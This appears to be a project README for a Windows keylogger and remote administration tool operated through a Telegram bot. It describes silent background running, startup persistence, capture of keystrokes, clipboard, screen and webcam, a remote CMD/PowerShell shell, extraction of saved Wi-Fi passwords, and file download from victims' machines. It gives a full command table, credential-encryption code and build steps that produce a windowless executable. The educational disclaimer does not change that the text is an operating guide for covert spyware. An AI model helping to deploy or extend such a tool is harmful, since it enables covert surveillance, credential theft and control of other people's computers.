# Advanced Telegram Keylogger & Remote Admin Tool

**Advanced Telegram Keylogger** is a comprehensive monitoring and remote administration tool for Windows. It operates silently in the background, capturing user activity, and allows for remote control via a Telegram bot. All data is sent securely to a designated Telegram chat.

⚠️ **This software is intended for educational and research purposes only.** Unauthorized installation on a computer without the owner's consent is illegal. The developer assumes no liability for misuse of this software.

## Features

-   **Stealth Operation**: Runs silently in the background with no visible windows or icons.
-   **Persistence**: Automatically adds itself to the Windows startup folder to ensure it runs after every reboot.
-   **Encrypted Communication**: Bot token and chat ID are encrypted within the script to prevent trivial extraction.
-   **Single-Instance Execution**: Uses a mutex to ensure only one instance of the tool runs at a time, preventing conflicts and improving stealth.
-   **Comprehensive Logging**:
    -   **Keylogger**: Captures all keystrokes.
    -   **Clipboard Monitoring**: Logs all copied text.
    -   **System Information**: Collects detailed system, network, and geolocation information on startup or on-demand.
-   **Continuous Surveillance**:
    -   **Screen Recording**: Periodically records the screen for a configurable duration (default: 5 minutes).
    -   **Webcam Recording**: Periodically records video from the webcam (default: 5 minutes).
-   **Full Remote Administration**:
    -   **Remote Shell**: Execute commands via CMD and PowerShell.
    -   **Wi-Fi Password Recovery**: Extracts and sends all saved Wi-Fi profiles and their passwords.
    -   **File System Access**: Remotely list directories, change the current path, and download files.
    -   **Self-Destruct**: A remote command allows the tool to completely uninstall itself.
-   **Device Management**:
    -   Assigns a unique ID to each device (defaulting to the hostname).
    -   Supports managing multiple devices from a single Telegram chat.

## Remote Commands

All commands must be sent to the bot in your Telegram chat. For commands that target a specific device, you must provide the device ID.

| Command      | Syntax                                      | Description                                                                                             |
| :----------- | :------------------------------------------ | :------------------------------------------------------------------------------------------------------ |
| `/devices`   | `/devices`                                  | Lists all currently active and reporting devices.                                                       |
| `/rename`    | `/rename <current_id> <new_id>`             | Renames a device.                                                                                       |
| `/sysinfo`   | `/sysinfo <device_id>`                      | Gets an updated report of system and geolocation information.                                           |
| `/screenshot`| `/screenshot <device_id>`                   | Captures and sends a screenshot of the device's screen.                                                 |
| `/camerashot`| `/camerashot <device_id>`                   | Takes and sends a picture from the device's webcam.                                                     |
| `/ls`        | `/ls <device_id> [directory_path]`          | Lists the contents of the specified directory. If no path is given, it lists the current working directory. |
| `/cd`        | `/cd <device_id> <directory_path>`          | Changes the current working directory on the remote device.                                             |
| `/getfile`   | `/getfile <device_id> <file_path>`          | Downloads the specified file from the device (max 100 MB).                                              |
| `/wifilist`  | `/wifilist <device_id>`                     | Lists all saved Wi-Fi profiles and their passwords.                                                     |
| `/getwifi`   | `/getwifi <device_id> <wifi_name>`          | Shows the password for a specific saved Wi-Fi network.                                                  |
| `/cmd`       | `/cmd <device_id> <command>`                | Executes a command using the Windows Command Prompt.                                                    |
| `/powershell`| `/powershell <device_id> <command>`         | Executes a command using PowerShell.                                                                    |
| `/uninstall` | `/uninstall <device_id>`                    | Removes the tool from the system (deletes startup entry and self).                                      |
| `/help`      | `/help`                                     | Shows this list of available commands.                                                                  |

## Setup & Configuration

1.  **Clone the Repository**: Download or clone the project to your local machine.

2.  **Install Dependencies**: Install the required Python libraries using `pip`.
    ```bash
    pip install opencv-python imageio imageio-ffmpeg requests pycountry pynput pyperclip mss numpy cryptography pywin32
    ```

3.  **Configure Credentials**: The script requires an encrypted Telegram Bot Token and Chat ID.
    1.  **Create a Telegram Bot**: Talk to the **BotFather** on Telegram to create a new bot and get your `BOT_TOKEN`.
    2.  **Get your Chat ID**: Talk to the **userinfobot** on Telegram to get your `CHAT_ID`.
    3.  **Encrypt Credentials**: Use the provided `SECRET_KEY` in the script to encrypt your token and chat ID.

        *Example Encryption Script:*
        ```python
        from cryptography.fernet import Fernet

        # IMPORTANT: Use the EXACT same secret key as in the main script
        SECRET_KEY = b'aVuzD_TMheAHemOnvrBvkh8f4A3--rTBuf8ERiTV0nk='

        # Your credentials
        BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'
        CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID'

        f = Fernet(SECRET_KEY)
        encrypted_bot_token = f.encrypt(BOT_TOKEN.encode('utf-8'))
        encrypted_chat_id = f.encrypt(CHAT_ID.encode('utf-8'))

        print(f"ENCRYPTED_BOT_TOKEN = {encrypted_bot_token}")
        print(f"ENCRYPTED_CHAT_ID = {encrypted_chat_id}")
        ```

4.  **Update the Script**: Copy the output from the encryption script and replace the `ENCRYPTED_BOT_TOKEN` and `ENCRYPTED_CHAT_ID` values in your chosen `.py` file.

5.  **Run the Script**:
    ```bash
    python keylogger_telegram.py
    ```
    The script will start running in the background and will begin sending data to your Telegram chat.

6.  **(Optional) Compile to EXE**: You can compile the script into a standalone Windows executable using `pyinstaller`.
    ```bash
    pip install pyinstaller
    
    # For the full version
    pyinstaller --noconsole --onefile keylogger_telegram.py

    # For the no-webcam version
    pyinstaller --noconsole --onefile keyloggerNoWebcam_telegram.py
    ```
    The executable will be located in the `dist` folder.

## Main Files

-   **`keylogger_telegram.py`**: The full-featured version with all capabilities, including keylogging, clipboard monitoring, screen recording, and webcam surveillance.
-   **`keyloggerNoWebcam_telegram.py`**: A lighter version that excludes webcam and screen recording features. Ideal for systems without a camera or for achieving lower resource usage and a smaller footprint.
